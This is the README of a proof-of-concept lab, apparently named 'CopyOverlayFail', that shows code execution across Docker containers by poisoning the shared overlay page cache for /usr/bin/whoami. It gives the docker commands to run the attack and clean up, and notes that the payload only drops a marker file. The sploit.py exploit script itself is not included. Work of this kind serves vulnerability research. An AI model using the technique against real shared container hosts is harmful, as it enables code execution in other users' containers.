# CopyOverlayFail

CopyFail cross-container code execution through shared overlay image-layer page cache.

This PoC uses two containers built from the same Ubuntu image. The attacker poisons cached bytes for `/usr/bin/whoami`; the victim later executes `whoami` and creates `/tmp/PWNED_FROM_ATTACKER` inside the victim container.

This is not host escape. The payload runs in the victim container context.

## Run

```bash
docker compose up -d --build
docker compose exec victim whoami
docker compose exec attacker python3 /lab/sploit.py
docker compose exec victim whoami
docker compose exec victim sh -c 'test -e /tmp/PWNED_FROM_ATTACKER && echo marker-present'
docker compose exec victim stat /tmp/PWNED_FROM_ATTACKER
```

Expected:

```text
root
[+] target: /usr/bin/whoami
...
marker-present
```

After poisoning, `victim whoami` prints nothing because it is executing the marker ELF instead of the real binary.

## Cleanup

```bash
docker compose down --remove-orphans
docker image rm copyoverlayfail-ubuntu:24.04
sudo sync
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

Use a disposable VM. The test can poison or corrupt the local Docker image layer/cache for the target binary.
